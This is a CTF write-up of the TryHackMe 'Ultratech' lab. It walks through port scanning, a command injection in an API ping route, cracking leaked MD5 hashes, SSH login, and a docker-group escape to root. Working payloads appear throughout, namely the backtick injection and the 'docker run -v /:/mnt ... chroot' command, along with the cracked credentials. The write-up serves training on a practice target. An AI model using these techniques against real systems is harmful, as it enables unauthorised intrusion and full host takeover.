---
weight: 3
title: "TryHackMe CTF: Ultratech"
date: 2022-10-19T19:42:40+08:00
description: "This is a writeup of the CTF Ultratech on TryHackMe"

title: CTF writeup - Ultratech
featuredImage: tryhackmebanner.jpg
hiddenfeaturedImage: false

tags: ["TryHackMe", "CTF", "Linux", "Webapp"]
categories: ["Writeups"]

lightgallery: true
summary: This CTF room gives us a tase of some basic penetration testing, enumeration, privilege escalation and web-app testing.
---

# TryHackMe CTF: Ultratech

![Untitled](/ultratech/Untitled.png)

# Summary

1. Enumerating the host with Nmap and Dirsearch leads to a web-app.
2. Once connected to the web-app, enumerating further reveals a running API.
3. The API has a source code stored on the webserver, which reveals a vulnerable route.
4. The vulnerable API route provides Code Execution on the underlying Linux OS on the host.
5. Through API fuzzing, stored hashed credentials are revealed and are easily cracked with Hashcat.
6. Gaining access to the host is made possible through SSH with the cracked credentials.
7. Escalating privileges to root is trivial, due to the user being a member of the group “docker”.

# NMAP

We can see here that the host is running 4 different services. Two of them are hosted on non-standard ports; 8081 and 31331. 

They seem to be hosting web-services; Node.js Express framework and Apache.

```bash
# Basic NMAP scan
┌──(kali㉿kali)-[~/tryhackme]
└─$ nmap -p- -T4 $IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 09:35 EDT
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 45.42% done; ETC: 09:36 (0:00:31 remaining)
Nmap scan report for 10.10.53.37
Host is up (0.042s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown

# NMAP Service enumeration
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -O  --script=banner -p 21,22,8081,31331  $IP
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 09:38 EDT
Nmap scan report for 10.10.53.37
Host is up (0.044s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_banner: 220 (vsFTPd 3.0.3)
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

# Dirsearch

Running a quick directory enumeration on the two sites reveals some more information. A robots.txt which leads us to partners.html login portal and a JS folder with an API source code.

Looking at the code reveals that the website has 2 routes to the API:

- const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
- form.action = `http://${getAPIURL()}/auth`

![Untitled](/ultratech/Untitled%201.png)

```bash
# Interesting URLs
┌──(kali㉿kali)-[~]
└─$ dirsearch -u $IP:31331 -e -x 400,500,403,401 -r -t 50 -w /home/kali/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 

  _|. _ _  _  _  _ _|_    v0.4.2                                                            
 (_||| _) (/_(_|| (_| )                                                                     
                                                                                            
Extensions: -x | HTTP method: GET | Threads: 50 | Wordlist size: 220545

Target: http://10.10.53.37:31331/

[09:55:55] Starting: 
[09:55:56] 301 -  320B  - /images  ->  http://10.10.53.37:31331/images/     (Added to queue)
[09:55:59] 301 -  316B  - /js  ->  http://10.10.53.37:31331/js/     (Added to queue)
[09:56:00] 301 -  317B  - /css  ->  http://10.10.53.37:31331/css/     (Added to queue)
[09:56:00] 301 -  324B  - /javascript  ->  http://10.10.53.37:31331/javascript/     (Added to queue)
[09:59:32] 403 -  302B  - /server-status

# API.js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();

# Possible usernames
John
Francois
Alvaro
r00t
p4c0
sq4l
```

# API Fuzzing

We can see the output when we feed the API some expected inputs.
However, if we try and change the requests to something unexpected, we get a different response.

We can **escape** the ping command and make the API execute native shell commands like list, find, cat etc.

```bash
# Intended PING command
/ping?ip=127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms

# Unintended PING command with character escapes
/ping?ip=`ls`
ping: utech.db.sqlite: Name or service not known

# AUTH
/auth?login=john&password=password123
Invalid credentials
```

![Notice the response with our request **GET /ping?ip=``ls`` HTTP/1.1** ](/ultratech/Untitled%202.png)

Notice the response with our request **GET /ping?ip=``ls`` HTTP/1.1** 

# Hashcat

A SQLITE database is revealed to us with the “ls” command. We cat it out and some hashes are revealed to us along with two usernames. They look like MD5 hashes.

The hashes are easily cracked with Hashcat.

```bash
**# HTTP Response**
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Content-Length: 147
ETag: W/"93-594eIY8lmtfDeu2ln6BdpbW24SI"
Date: Mon, 19 Sep 2022 17:12:23 GMT
Connection: close

ping: )���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded

# Cracking the hashes
┌──(kali㉿kali)-[~/tryhackme]
└─$ hashcat -m 0 users.hash ~/wordlists/rockyou.txt
Dictionary cache built:
* Filename..: /home/kali/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

f357a0c52799563c7c7b76c1e7543a32:n100906                  
0d0ea5111e3c1def594c1684e3b9be84:mrsheafy**

```

# Gaining access

Now that we have some credentials, we can SSH to the host and get an interactive, proper shell.

Seeing that we are a member of the docker group, we could probably exploit this somehow to elevate our privileges or read some files belonging to the root user.

```bash
# SSH
Last login: Mon Sep 19 17:39:16 2022 from 10.14.6.6
r00t@ultratech-prod:~$ whoami
r00t
r00t@ultratech-prod:~$ uname -a
Linux ultratech-prod 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
r00t@ultratech-prod:~$
r00t@ultratech-prod:~$ groups
r00t docker
```

# Privilege Escalation

A quick check at GTFOBins tells us that we can break out from restricted environments if we are in the **docker** group. We are root and can basically do anything we want from here, including getting the last flags to complete the room.

```bash
# Getting root shell
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        3 years ago         15.8MB

r00t@ultratech-prod:~$ **docker run -v /:/mnt --rm -it bash chroot /mnt sh**
# whoami
root
```